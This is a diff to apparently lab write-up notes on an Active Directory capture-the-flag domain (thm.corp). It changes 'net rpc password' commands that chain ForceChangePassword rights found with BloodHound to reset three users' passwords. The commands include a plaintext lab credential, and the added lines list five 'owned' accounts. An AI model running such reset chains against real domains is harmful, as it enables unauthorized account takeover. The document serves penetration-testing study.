@@ -68,7 +68,7 @@ In bloodhound, if you right click on one of the arrows that contains the `rights
 #### Changing SHAWNA_BRAY's password using TABATHA_BRITT's credentials
 
 
-`net rpc password 'SHAWNA_BRAY' 'Password@4444' -U thm.corp/'TABATHA_BRITT'%'marlboro(1985)' -S \<MACHINE IP>`
+`net rpc password 'SHAWNA_BRAY' 'Password@2020' -U thm.corp/'TABATHA_BRITT'%'marlboro(1985)' -S \<MACHINE IP>`
 
 
 Confirm that the changes were successful  choosing Execution rights->First degree RDP privileges.
@@ -78,7 +78,7 @@ Confirm that the changes were successful  choosing Execution rights->First degre
 
 The **ForceChangePassword** permission allows us (in this case SHAWNA_BRAY\@THM.CORP) to reset a user's password without knowing their current password. So this user can reset CRUZZ_HALL\@THM.CORP's password.
 
-`net rpc password 'CRUZ_HALL' 'Password@4444' -U thm.corp/'SHAWNA_BRAY'%'newPassword@4444' -S \<MACHINE IP>`  
+`net rpc password 'CRUZ_HALL' 'Password@2021' -U thm.corp/'SHAWNA_BRAY'%'Password@2020' -S \<MACHINE IP>`  
 
 Confirm that the changes were successful  choosing Execution rights->First degree RDP privileges.
 
@@ -88,6 +88,16 @@ Confirm that the changes were successful  choosing Execution rights->First degre
 
 Same as above, this time CRUZZ_HALL\@THM.CORP can reset DARLA_WINTERS\@THM.CORP's password.
 
-`net rpc password 'DARLA_WINTERS' 'Password@4444' -U thm.corp/'CRUZ_HALL'%'newPassword@4444' -S \<MACHINE IP>`  
+`net rpc password 'DARLA_WINTERS' 'Password@2022' -U thm.corp/'CRUZ_HALL'%'Password@2021' -S \<MACHINE IP>` 
+
+Now, you have five owned users :
+
+```undefined
+AUTOMATE
+TABATHA_BRITT
+SHAWNA_BRAY
+CRUZ_HALL
+DARLA_WINTERS
+```
 
 **Next step:** [[Delegation]]
